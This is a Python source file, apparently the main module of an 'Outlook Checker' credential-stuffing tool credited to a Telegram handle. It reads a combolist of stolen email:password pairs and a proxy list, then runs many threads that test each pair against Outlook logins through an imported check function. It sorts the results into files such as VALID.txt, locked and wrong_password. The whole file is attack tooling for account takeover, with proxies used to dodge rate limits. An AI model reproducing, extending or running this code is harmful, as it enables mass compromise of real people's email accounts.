import threading, time, gc, os
from login import check
from utils import *

def thread_worker(thread_id):
    global thread_restart_enabled, combo_queue, combo_file_position, combo_file_size
    consecutive_failures = 0
    max_consecutive_failures = 15
    thread_name = f"Thread-{thread_id}"
    local_processed = 0
    
    while thread_restart_enabled:
        try:
            combo = combo_queue.get(timeout=3)
        except queue.Empty:
            if combo_file_position < combo_file_size:
                time.sleep(0.1)
                continue
            else:
                break

        if ":" not in combo:
            combo_queue.task_done()
            update_counter("failed")
            continue

        email, password = combo.split(":", 1)

        try:
            account, reason = check(email, password)
            consecutive_failures = 0
            local_processed += 1
            
        except Exception as _:
            consecutive_failures += 1
            combo_queue.task_done()
            update_counter("failed")
            
            if consecutive_failures >= max_consecutive_failures:
                eprint(f"{thread_name} restarting due to {consecutive_failures} consecutive failures")
                break
            continue
        
        update_counter(reason)
        
        file_path_map = {
            "valid": "output/VALID.txt",
            "pending_security": "output/VALID_pendingSecurity.txt",
            "locked": "output/others/locked.txt",
            "recovery": "output/others/recovery.txt",
            "password": "output/others/wrong_password.txt",
            "not_exist": "output/others/not_exist.txt",
            "invalid": "output/others/invalid.txt",
            "failed": "output/others/failed.txt"
        }
        
        file_path = file_path_map.get(reason, "output/others/unknown.txt")
        write_to_file_buffered(file_path, account)

        if local_processed % 50 == 0:
            gc.collect()

        if reason == "failed":
            iprint(thread_id, "FAILED", f"Maximum proxy retry limit reached: {account}")
        elif reason == "valid":
            vprint(thread_id, "VALID", account)
        elif reason == "pending_security":
            vprint(thread_id, "VALID (pending security)", account)
        elif reason == "locked":
            oprint(thread_id, "LOCKED", account)
        elif reason == "recovery":
            oprint(thread_id, "RECOVERY", account)
        elif reason == "password":
            iprint(thread_id, "INVALID (wrong pass)", account)
        elif reason == "not_exist":
            iprint(thread_id, "INVALID (not exist)", account)
        elif reason == "invalid":
            iprint(thread_id, "INVALID", account)

        combo_queue.task_done()

def main():
    global start_time, title_update_thread, should_update_title, target_thread_count, thread_restart_enabled
    
    check_windows_only()
    set_console_title("Outlook Checker By: t.me/occursive")
    
    init_config()
    
    ensure_output_folder()
    
    success, unique_combos, duplicates, invalid_format_count = preprocess_combo_file(COMBOLIST_FILE)
    if not success:
        eprint("Failed to preprocess combo file.")
        safe_exit()
        return
    
    if not load_combos_optimized(COMBOLIST_FILE):
        safe_exit()
        return
    
    safe_print(f"{Fore.LIGHTBLACK_EX}Loaded {Fore.LIGHTGREEN_EX}{unique_combos:,} {Fore.LIGHTBLACK_EX}unique combos. Removed {Fore.LIGHTRED_EX}{duplicates:,} {Fore.LIGHTBLACK_EX}duplicates and {Fore.LIGHTRED_EX}{invalid_format_count:,} {Fore.LIGHTBLACK_EX}invalid format entries.\n")

    proxy_list = load_proxies(PROXIES_FILE)
    if not proxy_list:
        eprint("Failed to load any proxies.")
        safe_exit()
        return

    import utils
    success = init_proxy_iterator(proxy_list, utils.CONFIG['proxy_type'])
    if not success:
        safe_exit()
        return

    target_thread_count = input_thread_count()
    if target_thread_count is None:
        return
    
    os.system('cls')

    set_start_time()

    safe_print(f"{Fore.LIGHTGREEN_EX}🚀 Tool successfully started!{Style.RESET_ALL}\n")
    
    title_update_thread = threading.Thread(target=title_updater, daemon=True)
    title_update_thread.start()

    feeder_thread = threading.Thread(target=combo_feeder, daemon=True)
    feeder_thread.start()

    for i in range(target_thread_count):
        start_worker_thread(i + 1, thread_worker)

    monitor_thread = threading.Thread(target=thread_monitor, args=(thread_worker,), daemon=True)
    monitor_thread.start()

    try:
        monitor_thread.join()
    except KeyboardInterrupt:
        safe_print(f"\n{Fore.RED}Program interrupted by user. Stopping...{Style.RESET_ALL}")
        thread_restart_enabled = False
        should_update_title = False
        return
    
    time.sleep(1)
    
    thread_restart_enabled = False
    should_update_title = False
    
    safe_print(f"{Fore.LIGHTGREEN_EX}All combos processed! Finalizing...{Style.RESET_ALL}")

    flush_all_buffers()
    
    with threads_lock:
        for thread in threads_list:
            if thread.is_alive():
                thread.join(timeout=10)
    
    time.sleep(0.5)

    should_update_title = False
    update_title()

    print_analysis_report()

    safe_exit()

if __name__ == "__main__":
    main()